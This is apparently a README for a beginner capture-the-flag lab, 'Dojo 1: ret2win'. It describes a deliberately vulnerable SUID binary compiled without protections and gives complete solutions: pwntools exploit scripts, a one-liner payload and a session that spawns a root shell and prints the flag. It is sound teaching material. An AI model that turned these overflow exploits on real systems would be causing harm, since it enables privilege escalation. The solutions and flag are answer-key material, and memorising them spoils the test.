# Dojo 1: ret2win (Beginner)

A classic buffer overflow challenge where you need to redirect execution to the `win()` function.

## Challenge Description

The challenge binary `/challenge/challenge` contains a buffer overflow vulnerability in the `gets()` function call. Your goal is to exploit this vulnerability to call the `win()` function, which will spawn a root shell and allow you to read the flag from `/flag`.

## Pre-installed Tools

Your workspace comes with a complete binary exploitation toolkit:

### Exploitation Framework
- **pwntools** - Python library for CTF and exploit development
- **Python 3** - With pip for installing additional packages

### Debuggers
- **GDB** - GNU Debugger
- **pwndbg** - Enhanced GDB for exploit development
- **gdbserver** - Remote debugging support

### Binary Analysis
- **checksec** - Check binary security properties
- **file** - Identify file types
- **strings** - Extract printable strings
- **objdump** - Disassemble binaries
- **readelf** - Display ELF information
- **strace** - Trace system calls
- **ltrace** - Trace library calls
- **ropper** - ROP gadget finder

### Utilities
- **vim/nano** - Text editors
- **curl/wget** - Download files
- **netcat/socat** - Network utilities
- **git** - Version control

## Building

```bash
docker build -t mini-dojo/dojo1-ret2win:latest .
```

## Technical Details

- **Binary protections**: None (compiled with `-fno-stack-protector -z execstack -no-pie`)
- **SUID bit**: Set (runs as root)
- **Buffer size**: 64 bytes
- **Architecture**: x86-64

## Solution Approaches

### Method 1: Using pwntools (Recommended)

Create a file `exploit.py`:

```python
#!/usr/bin/env python3
from pwn import *

# Start the process
p = process('/challenge/challenge')

# Receive output and extract win() address
p.recvuntil(b'win() function is located at: ')
win_addr = int(p.recvline().strip(), 16)

log.info(f"win() address: {hex(win_addr)}")

# Create payload
payload = b'A' * 72  # Fill buffer (64) + saved RBP (8)
payload += p64(win_addr)  # Overwrite return address

# Send payload
p.sendline(payload)

# Get interactive shell
p.interactive()
```

Run it:
```bash
python3 exploit.py
# Then: cat /flag
```

### Method 2: Interactive pwntools

```python
from pwn import *

# Manual approach
win_addr = 0x4011e6  # Replace with actual address from running the binary
payload = flat([
    b'A' * 72,
    p64(win_addr)
])

p = process('/challenge/challenge')
p.sendline(payload)
p.interactive()
```

### Method 3: One-liner (No pwntools)

```bash
# First, get the address
/challenge/challenge
# Note the address, e.g., 0x4011e6

# Then exploit
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + (0x4011e6).to_bytes(8, "little"))' | /challenge/challenge
```

### Method 4: Using GDB for Analysis

```bash
# Start GDB with pwndbg
gdb /challenge/challenge

# Inside GDB:
(gdb) break main
(gdb) run
(gdb) disass win
(gdb) disass vuln
(gdb) info functions
(gdb) checksec
```

## Debugging Tips

### Find the Offset

```python
from pwn import *

# Generate cyclic pattern
pattern = cyclic(200)
p = process('/challenge/challenge')
p.sendline(pattern)
p.wait()

# Find offset in GDB or using cyclic_find()
```

### Check Binary Protections

```bash
checksec /challenge/challenge
```

Expected output:
```
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE
```

## Example Session

```bash
hacker@workspace:~$ /challenge/challenge
Welcome to Dojo 1: ret2win!
==============================
win() function is located at: 0x4011e6
Enter your input: ^C

hacker@workspace:~$ python3
>>> from pwn import *
>>> p = process('/challenge/challenge')
>>> p.recvuntil(b'win() function is located at: ')
>>> win_addr = int(p.recvline().strip(), 16)
>>> payload = b'A' * 72 + p64(win_addr)
>>> p.sendline(payload)
>>> p.interactive()
[*] Switching to interactive mode
🎉 Congratulations! You called the win() function!
Spawning a root shell...

# $ cat /flag
flag{dojo1-ret2win:1:abc123def456}
```

## Learning Resources

### Pwntools Documentation
- [Pwntools Tutorial](https://docs.pwntools.com/en/stable/intro.html)
- [Pwntools API](https://docs.pwntools.com/en/stable/globals.html)

### GDB with pwndbg
- [pwndbg Commands](https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md)
- [GDB Cheat Sheet](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)

### Buffer Overflow Basics
- [Buffer Overflow Explained](https://en.wikipedia.org/wiki/Buffer_overflow)
- [Stack Smashing Tutorial](https://www.exploit-db.com/docs/english/28475-linux-stack-based-buffer-overflows.pdf)

## Common Issues

### "ModuleNotFoundError: No module named 'pwn'"

The container has pwntools pre-installed. If you see this error, you're not in the workspace terminal.

### "Permission denied" when reading /flag

You need to exploit the binary to get a root shell first. Check that you see `#` prompt (not `$`).

### Exploit doesn't work

1. Verify you're using the correct win() address from the program output
2. Check that your payload is exactly 80 bytes (72 padding + 8 address)
3. Ensure you're using little-endian byte order
4. Try debugging with GDB to see what's happening

## Quick Reference

```bash
# Check tools are available
python3 --version
python3 -c "from pwn import *; print(pwnlib.__version__)"
gdb --version
checksec --version

# Analyze binary
file /challenge/challenge
checksec /challenge/challenge
strings /challenge/challenge

# Run challenge
/challenge/challenge

# Get help
help
cat /challenge/README.md
```

---

**Happy hacking!** 🥋
